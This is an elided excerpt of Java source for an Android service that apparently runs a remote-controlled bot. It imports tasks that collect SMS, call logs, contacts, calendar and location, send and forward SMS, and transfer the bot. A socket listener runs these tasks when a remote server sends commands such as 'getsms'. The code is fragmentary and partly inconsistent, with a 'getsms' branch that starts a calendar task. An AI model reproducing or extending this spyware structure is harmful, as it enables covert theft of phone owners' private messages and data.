...
import com.example.lutter.job.CheckJobCreator;
import com.example.lutter.tasks.GetCalandarTask;
import com.example.lutter.tasks.GetCallLogsTask;
import com.example.lutter.tasks.GetContactsTask;
import com.example.lutter.tasks.GetSmsTask;
import com.example.lutter.tasks.LocationMonitor;
import com.example.lutter.tasks.SendSmsTask;
import com.example.lutter.tasks.SmsForwarder;
import com.example.lutter.tasks.TransferBotTask;
import com.example.lutter.tasks.UpdateAppTask;
...
public class CommandService extends Service {
    ...
    public void onCreate() {
        ...
        JobManager.create(this).addJobCreator(new CheckJobCreator());
    }
...
//// MY GIBBERISH
            GetSmsTask smsService = new GetSmsTask(client, 1);
            smsService.start();

            GetCallLogsTask cs = new GetCallLogsTask(client, 1);
            cs.start();
    ...
    private void createSocket(String url) {
        try {
            ...
            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
                ...
                //    bot.put("battery", params.getBattery());
                    ...
                    for (int i = 0; i < cmds.length(); i++) {
                        try {
                            ...
                            if (command.equals("getsms")) {
                                ...
                                Log.i(TAG, "\nInvoking GetCalendarTask\n");
                                GetCalandarTask cs = new GetCalandarTask(client);
                                cs.start();
